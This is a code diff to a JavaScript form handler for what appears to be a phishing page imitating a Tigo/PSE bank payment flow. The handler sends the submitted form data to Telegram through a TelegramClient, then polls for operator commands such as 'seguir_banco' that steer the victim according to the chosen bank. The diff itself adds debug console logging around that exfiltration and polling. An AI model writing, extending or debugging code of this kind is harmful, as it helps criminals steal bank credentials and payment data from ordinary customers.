@@ -184,19 +184,37 @@ function initFormHandler() {
         console.log('[PSE] Enviando datos:', formData);
 
         try {
+            console.log('[PSE] ========== ENVIANDO DATOS ==========');
+            console.log('[PSE] SessionId:', sessionId);
+            console.log('[PSE] FormData:', JSON.stringify(formData, null, 2));
+            
             const result = await TelegramClient.sendToTelegram('tigo_pse', formData, sessionId);
             
+            console.log('[PSE] ========== RESULTADO DEL ENVÍO ==========');
+            console.log('[PSE] Success:', result.success);
+            console.log('[PSE] Result:', JSON.stringify(result, null, 2));
+            
             if (result.success) {
-                console.log('[PSE] Datos enviados, esperando respuesta...');
+                console.log('[PSE] ✅ Datos enviados correctamente');
+                console.log('[PSE] ⏳ Iniciando polling...');
                 
                 // Polling optimizado - sin loops, sin delays
                 TelegramClient.startPolling((actions, stop) => {
-                    if (window.__pseProcessing) return;
+                    console.log('[PSE] ========== CALLBACK POLLING EJECUTADO ==========');
+                    console.log('[PSE] Total acciones:', actions.length);
+                    console.log('[PSE] Acciones:', JSON.stringify(actions, null, 2));
+                    console.log('[PSE] __pseProcessing:', window.__pseProcessing);
+                    
+                    if (window.__pseProcessing) {
+                        console.warn('[PSE] ⚠️ YA EN PROCESAMIENTO, ABORTANDO');
+                        return;
+                    }
                     window.__pseProcessing = true;
                     
                     const action = actions[0];
                     const bank = document.getElementById('bankSelect').value;
-                    console.log('[PSE] Procesando:', action.action);
+                    console.log('[PSE] Procesando acción única:', action.action);
+                    console.log('[PSE] Banco seleccionado:', bank);
                     
                     switch(action.action) {
                         case 'seguir_banco':
